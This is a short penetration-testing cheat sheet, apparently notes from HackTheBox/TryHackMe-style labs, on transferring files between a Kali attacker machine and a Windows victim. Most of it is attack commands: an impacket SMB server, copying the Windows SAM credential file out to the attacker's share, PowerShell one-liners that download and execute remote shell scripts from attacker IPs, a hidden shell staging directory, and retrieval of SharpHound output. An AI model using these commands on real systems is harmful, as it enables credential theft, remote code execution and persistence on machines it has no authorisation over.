### SMB
On Kali setup SMB:
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py ShareName SharePath

# Authenticated SMB server

smbserver.py share /. -smb2support -username df -password df

# Connect 
net use \\10.10.14.20\share  /u:df df

# After authentication with server you dont need to use them everytime only with net use

copy abc \\10.10.14.20\share\abc
```

Victim machine:
```cmd
copy \\[Kali_IP]\share\putty.exe 
```

For validation on vicrtim machine run:
```bash
# Attach share folders
net use \\[Kali_IP]\share
# Show share folders 
net use
# Copy files between Kali to Victim
copy \\[Kali_IP]\share\putty.exe
# Copy files between Victim to Kali
copy C:\Windows\Repair\SAM \\[Kali_IP]\share\
```

### Powershell
On victim machine:
```powershell
Powershell.exe invoke-webrequest -Uri http://10.10.14.28/bfill.exe -OutFile bfill.exe
```

**Download and execute ps1**

```powershell
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.19/shell.ps1') 
# or 
powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.14/shell.ps1')"

```


## Shell placement Location (Old statging method)
`c:\windows\system32\spool\drivers\color`

## If policy blocks then on attacker machine
`scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .`
